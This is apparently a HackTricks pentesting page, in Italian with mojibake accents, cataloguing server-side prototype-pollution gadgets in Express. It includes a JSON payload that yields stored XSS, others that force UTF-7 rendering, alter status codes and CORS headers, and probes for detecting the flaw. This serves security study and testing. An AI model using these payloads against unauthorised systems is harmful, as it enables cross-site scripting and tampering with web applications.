# Express Prototype Pollution Gadgets

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Serve XSS responses

**Per ulteriori dettagli** [**dai un'occhiata alla ricerca originale**](https://portswigger.net/research/server-side-prototype-pollution)

### Cambia il tipo di contenuto JSON in HTML

In un'app Express che utilizza una **risposta di tipo contenuto JSON** e riflette un JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
In questi casi, l'XSS non √® normalmente possibile con un tipo di contenuto JSON. Tuttavia, con la contaminazione del prototipo possiamo **confondere Express per restituire una risposta HTML.** Questa vulnerabilit√† si basa sull'applicazione che utilizza **`res.send(obj)`** e utilizza il body parser con il tipo di contenuto application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
By **inquinando** le propriet√† **`body`** e **`_body`**, √® possibile causare **a Express di servire il tipo di contenuto HTML** e riflettere la propriet√† `_body`, risultando in XSS memorizzato.

### Render UTF7

√à possibile far s√¨ che express **renderizzi contenuti UTF-7 con**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Tecniche di Scansione Sicure

### Spazi JSON

Il seguente PP far√† s√¨ che gli attributi all'interno di un JSON abbiano uno spazio extra che non interromper√† la funzionalit√†:
```json
{"__proto__":{"json spaces": " "}}
```
Poi un JSON riflesso apparir√† cos√¨:
```json
{"foo":  "bar"} -- Note the extra space
```
### Exposed Headers

Il seguente gadget PP far√† s√¨ che il server restituisca l'intestazione HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Richiede che il **modulo CORS sia installato**

### **Metodo OPTIONS**

Con il seguente payload, √® possibile **nascondere un metodo da una risposta OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Stato**

√à possibile modificare il **codice di stato restituito** utilizzando il seguente payload PP:
```json
{"__proto__":{"status":510}}
```
### Errore

Quando assegni a un prototipo con un primitivo come una stringa, produce un **operazione no-op poich√© il prototipo deve essere un oggetto**. Se tenti di assegnare un oggetto prototipo a `Object.prototype` stesso, questo **sollever√† un'eccezione**. Possiamo utilizzare questi due comportamenti per **verificare se la contaminazione del prototipo √® avvenuta con successo**:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Valore Riflesso

Quando un'applicazione include un oggetto nella sua risposta, creare un attributo con un **nome insolito insieme a `__proto__`** pu√≤ essere rivelatore. In particolare, se **solo l'attributo insolito viene restituito** nella risposta, questo potrebbe indicare la vulnerabilit√† dell'applicazione:
```json
{"unusualName":"value","__proto__":"test"}
```
Inoltre, in scenari in cui viene utilizzata una libreria come Lodash, impostare una propriet√† sia tramite inquinamento del prototipo (PP) che direttamente all'interno dell'oggetto offre un altro approccio diagnostico. Se tale propriet√† √® omessa dalla risposta, suggerisce che Lodash sta verificando l'esistenza della propriet√† nell'oggetto target prima di unire:
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Misc

### Allow Dots

C'√® un'opzione in Express che ti consente di **creare oggetti dai parametri della query string**.\
Potresti sicuramente usarla in una **catena** di bug per sfruttare una **vulnerabilit√† di inquinamento del prototipo**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` crea un oggetto in Node.**

## Riferimenti

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)


{% hint style="success" %}
Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.

</details>
{% endhint %}
